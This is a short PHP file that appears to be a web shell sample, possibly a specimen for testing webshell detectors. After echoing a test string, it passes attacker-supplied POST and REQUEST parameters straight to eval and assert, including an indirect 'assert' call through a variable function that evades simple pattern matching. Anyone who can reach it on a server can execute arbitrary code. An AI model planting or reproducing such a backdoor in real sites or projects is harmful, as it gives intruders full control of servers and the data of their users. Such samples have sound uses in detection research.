<?php
echo '<s>test</s>';
eval($_POST['shell']);

assert($_REQUEST[23333]);

$f = 'assert';
$f(...$_POST);
